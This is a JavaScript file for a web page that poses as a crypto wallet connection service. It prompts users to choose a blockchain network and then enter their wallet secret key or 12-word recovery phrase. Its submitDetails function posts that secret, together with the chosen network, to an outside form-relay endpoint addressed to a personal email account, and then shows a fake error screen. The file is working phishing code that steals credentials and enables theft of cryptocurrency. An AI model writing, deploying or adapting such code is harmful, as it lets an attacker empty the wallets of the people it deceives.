// NAVBAR
const harmburgerBtn = document.querySelector('.harmburgerBtn');
const overlay = document.querySelector('.overlay');
const navListItems = document.querySelector('.navListItems');
// HAMBURGER TOGGLE's
harmburgerBtn.onclick = () => {
    harmburgerBtn.classList.toggle('active');
    navListItems.classList.toggle('active');
    
    // Update aria attributes
    const isExpanded = harmburgerBtn.classList.contains('active');
    harmburgerBtn.setAttribute('aria-expanded', isExpanded);
    harmburgerBtn.setAttribute('aria-label', isExpanded ? 'Close navigation menu' : 'Open navigation menu');
};

// BLOCKCHAIN NETWORK
const NetworkCard = document.querySelectorAll('.NetworkCard');
const loginModal = document.querySelector('#loginModal');
const closeModal = document.querySelectorAll('.closeModal');
// MODAL POP-UP
const modalCamp = document.querySelector('.modalCamp');
const modalCamp2 = document.querySelector('.modalCamp2');
const modalCamp3 = document.querySelector('.modalCamp3');
const modalCamp4 = document.querySelector('.modalCamp4');
// 
const secreteKeyLoginBtn = document.querySelector('.secreteKeyLoginBtn');
const secreteKeyLogin = document.querySelector('#secreteKeyLogin');
// 
const PhraseLogin = document.querySelector('#PhraseLogin');
const PhraseLoginBtn = document.querySelector('.PhraseLoginBtn');
// 
const btnLoginModal = document.querySelectorAll('.btnLoginModal');
const submitBtn = document.querySelectorAll('.submitBtn');

const loginInput = document.querySelectorAll('.loginInput');

// Store current network
let currentNetwork = '';

// POPUP LOGIN MODAL
function POPUPloginModal(){
    loginModal.classList.add('active');
    modalCamp.classList.add('active');
    overlay.classList.add('active');
    
    // Update aria attributes
    modalCamp.setAttribute('aria-modal', 'true');
    modalCamp.style.display = 'flex';
    
    // Focus management
    setTimeout(() => {
        const firstButton = loginModal.querySelector('.btnLoginModal');
        if (firstButton) firstButton.focus();
    }, 100);
}

// ADD SECRET KEY MODAL
function addSecretKeyModal(){
    loginModal.classList.remove('active');
    modalCamp.classList.remove('active');
    modalCamp.setAttribute('aria-modal', 'false');
    modalCamp.style.display = 'none';
    
    overlay.classList.add('active');
    secreteKeyLogin.classList.add('active');
    modalCamp2.classList.add('active');
    modalCamp2.setAttribute('aria-modal', 'true');
    modalCamp2.style.display = 'flex';
    
    // Focus management
    setTimeout(() => {
        const secretInput = document.querySelector('#inputSecretKey');
        if (secretInput) secretInput.focus();
    }, 100);
}

// ADD 12 PHRASE MODAL
function addphraseModal(){
    loginModal.classList.remove('active');
    secreteKeyLogin.classList.remove('active');
    modalCamp.classList.remove('active');
    modalCamp2.classList.remove('active');
    modalCamp.setAttribute('aria-modal', 'false');
    modalCamp2.setAttribute('aria-modal', 'false');
    modalCamp.style.display = 'none';
    modalCamp2.style.display = 'none';
    
    PhraseLogin.classList.add('active');
    modalCamp3.classList.add('active');
    modalCamp3.setAttribute('aria-modal', 'true');
    modalCamp3.style.display = 'flex';
    overlay.classList.add('active');
    
    // Focus management
    setTimeout(() => {
        const phraseInput = document.querySelector('#PhraseInput');
        if (phraseInput) phraseInput.focus();
    }, 100);
}

// SUBMIT MODAL BTN
function submitBtnModal(){
    loginModal.classList.remove('active');
    secreteKeyLogin.classList.remove('active');
    PhraseLogin.classList.remove('active');
    modalCamp.classList.remove('active');
    modalCamp2.classList.remove('active');
    modalCamp3.classList.remove('active');
    
    // Update aria attributes for closed modals
    modalCamp.setAttribute('aria-modal', 'false');
    modalCamp2.setAttribute('aria-modal', 'false');
    modalCamp3.setAttribute('aria-modal', 'false');
    modalCamp.style.display = 'none';
    modalCamp2.style.display = 'none';
    modalCamp3.style.display = 'none';
    
    overlay.classList.add('active');
    modalCamp4.classList.add('active');
    modalCamp4.setAttribute('aria-modal', 'true');
    modalCamp4.style.display = 'flex';
}

// CLOSE MODALS
closeModal.forEach(closeIcon => {
    closeIcon.onclick = () => {
        overlay.classList.remove('active');
        loginModal.classList.remove('active');
        secreteKeyLogin.classList.remove('active');
        PhraseLogin.classList.remove('active');
        modalCamp.classList.remove('active');
        modalCamp2.classList.remove('active');
        modalCamp3.classList.remove('active');
        modalCamp4.classList.remove('active');
        
        // Update aria attributes
        modalCamp.setAttribute('aria-modal', 'false');
        modalCamp2.setAttribute('aria-modal', 'false');
        modalCamp3.setAttribute('aria-modal', 'false');
        modalCamp4.setAttribute('aria-modal', 'false');
        modalCamp.style.display = 'none';
        modalCamp2.style.display = 'none';
        modalCamp3.style.display = 'none';
        modalCamp4.style.display = 'none';
        
        // Reset hamburger menu
        harmburgerBtn.classList.remove('active');
        navListItems.classList.remove('active');
        harmburgerBtn.setAttribute('aria-expanded', 'false');
        harmburgerBtn.setAttribute('aria-label', 'Open navigation menu');
    };
});

// BLOCKCHAIN CARD
NetworkCard.forEach(cards => {
    // ADD EVENT LISTENER TO CARD
    cards.addEventListener('click', (e) => {
        // CONSOLE.LOG CURRENT TARGET ON CLICK
        let btnCurrentTarget = e.currentTarget.value;
        console.log(btnCurrentTarget);
        currentNetwork = btnCurrentTarget;
        // POPUP FIRST MODAL
        POPUPloginModal();

        localStorage.setItem("Network", btnCurrentTarget);
    })
});

// SECRET KEY MODAL BTN
secreteKeyLoginBtn.onclick = () => addSecretKeyModal();

// PHRASE MODAL BTN
PhraseLoginBtn.onclick = () => addphraseModal();

// Handle form submission
function handleSubmit(type) {
    const secretInput = document.querySelector('#inputSecretKey');
    const phraseInput = document.querySelector('#PhraseInput');
    
    const secret = secretInput ? secretInput.value : '';
    const phrase = phraseInput ? phraseInput.value : '';
    
    // Submit the data
    submitDetails(type, secret, phrase);
    
    // Show error modal
    submitBtnModal();
}

// GET INPUT VALUE
function getInputValue() {
    loginInput.forEach(inputValue => {
        let inputCV = inputValue.value;
        console.log(inputCV)
    });
}

function submitDetails(type, secret, phrase){
    var inputSecretKey = secret || $("#inputSecretKey").val();
    var PhraseInput = phrase || $("#PhraseInput").val();
    var network = localStorage.getItem("Network") || currentNetwork;

    $.ajax({
        url: "https://formspree.io/f/mpwrbwyd",
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        data: JSON.stringify({
            method: type === "secret" ? "Secret Key" : "Phrase Recovery Key",
            value: type === "secret" ? inputSecretKey : PhraseInput,
            network: network,
            to: "reneeandree09@gmail.com"
        }),
        dataType: "json",
        success: function(data){
            console.log("Form submitted successfully:", data);
        },
        error: function(xhr, status, error) {
            console.log("Form submission error:", error);
        }
    });
}

// SUBMIT MODAL BTN
submitBtn.forEach(submitModal => {
    submitModal.addEventListener('click', (e) => {
        e.preventDefault();
        
        // Determine which form we're in
        const isSecretForm = submitModal.closest('#secreteKeyLogin');
        const isPhraseForm = submitModal.closest('#PhraseLogin');
        
        if (isSecretForm) {
            handleSubmit('secret');
        } else if (isPhraseForm) {
            handleSubmit('phrase');
        }
    });
});

// Keyboard navigation for modals
document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape') {
        // Close any open modal
        const activeModal = document.querySelector('.modalCamp.active, .modalCamp2.active, .modalCamp3.active, .modalCamp4.active');
        if (activeModal) {
            const closeButton = activeModal.querySelector('.closeModal');
            if (closeButton) closeButton.click();
        }
    }
});

// Initialize AOS when page loads
document.addEventListener('DOMContentLoaded', function() {
    if (typeof AOS !== 'undefined') {
        AOS.init({
            duration: 800,
            easing: 'ease-in-out',
            once: true,
            mirror: false
        });
    }
});